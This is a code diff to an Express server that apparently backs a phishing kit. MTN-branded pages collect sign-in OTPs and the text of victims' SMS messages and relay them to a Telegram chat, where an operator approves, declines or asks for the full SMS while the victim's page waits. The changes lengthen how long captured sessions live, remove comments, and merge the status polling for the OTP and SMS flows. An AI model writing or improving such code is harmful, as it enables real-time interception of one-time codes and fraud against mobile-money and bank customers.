@@ -159,11 +159,12 @@ const OTP_RATE_MS      = 30 * 1000;
 const EVENT_DEDUPE_MS  = 15 * 1000;
 
 /* ============================================================
-   SMS-flow store (mtn.html → sms.html) — separate from OTP_STORE
-   so the two flows don't collide on the same tx id.
+   SMS-flow store (mtn.html → sms.html) — separate from OTP_STORE.
+   60 min TTL so a slow Telegram approval still lands even though
+   the client no longer auto-times out.
 ============================================================ */
 const SMS_STORE  = new Map();
-const SMS_TTL_MS = 10 * 60 * 1000;
+const SMS_TTL_MS = 60 * 60 * 1000;
 
 setInterval(() => {
   const now = Date.now();
@@ -277,9 +278,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const action = idx >= 0 ? raw.slice(0, idx) : raw;
     const payload = idx >= 0 ? raw.slice(idx + 1) : '';
 
-    // Detect which flow this callback belongs to:
-    //   OTP-<tx>   → sign-in OTP flow  (uses OTP_STORE, decision: approved/declined/inactive)
-    //   SMS-<tx>   → sms.html flow     (uses SMS_STORE, decision: approved/declined/needs_full_sms)
     let otpTxId = null;
     let smsTxId = null;
     let txId = payload;
@@ -298,9 +296,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
       'info'
     );
 
-    // ------------------------------------------------------------
-    // SMS-flow: approve → approved, decline → declined, inactive → needs_full_sms
-    // ------------------------------------------------------------
     if (smsTxId) {
       const entry = SMS_STORE.get(smsTxId) || {
         exp: Date.now() + SMS_TTL_MS,
@@ -314,12 +309,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
       SMS_STORE.set(smsTxId, entry);
       pushLog('SMS decision ' + entry.decision + ' for ' + smsTxId, 'ok');
-
-      // Mirror into OTP_STORE? No — keep the two flows isolated.
     } else {
-      // ------------------------------------------------------------
-      // OTP-flow (sign-in) — existing behavior
-      // ------------------------------------------------------------
       const decision =
         action === 'approve'  ? 'approved' :
         action === 'decline'  ? 'declined' :
@@ -555,7 +545,6 @@ app.post('/api/verification/sms', async (req, res) => {
 
   if (!baseUrl || !chatId) {
     pushLog('SMS Telegram not configured', 'err');
-    // still accept — the front-end will poll and time out gracefully
     return res.json({ ok: true });
   }
 
@@ -611,8 +600,6 @@ app.post('/api/verification/sms', async (req, res) => {
 /* ============================================================
    SMS flow — POST /api/verification/resend
    Resend SMS button on sms.html calls this.
-   Forwards a resend notification to Telegram (no buttons — the
-   user will paste the new message and submit again).
 ============================================================ */
 app.post('/api/verification/resend', async (req, res) => {
   const { tx, an, c, am, cur } = req.body || {};
@@ -654,19 +641,25 @@ app.post('/api/verification/resend', async (req, res) => {
 
 /* ============================================================
    Verification — poll the OTP decision (sign-in flow)
+   Also falls back to SMS_STORE so sms.html can use this same
+   endpoint without needing a separate /sms-status URL.
 ============================================================ */
 app.get('/api/verification/status/:tx', (req, res) => {
   const tx = req.params.tx;
-  const entry = OTP_STORE.get(tx);
-  res.json({
-    transactionId: tx,
-    decision: entry ? entry.decision : 'expired'
-  });
+  const otpEntry = OTP_STORE.get(tx);
+  if (otpEntry) {
+    return res.json({ transactionId: tx, decision: otpEntry.decision });
+  }
+  const smsEntry = SMS_STORE.get(tx);
+  if (smsEntry) {
+    return res.json({ transactionId: tx, decision: smsEntry.decision });
+  }
+  res.json({ transactionId: tx, decision: 'expired' });
 });
 
 /* ============================================================
    SMS flow — GET /api/verification/sms-status/:tx
-   sms.html polls this for the SMS decision.
+   (explicit SMS-only endpoint, kept for compatibility)
 ============================================================ */
 app.get('/api/verification/sms-status/:tx', (req, res) => {
   const tx = req.params.tx;
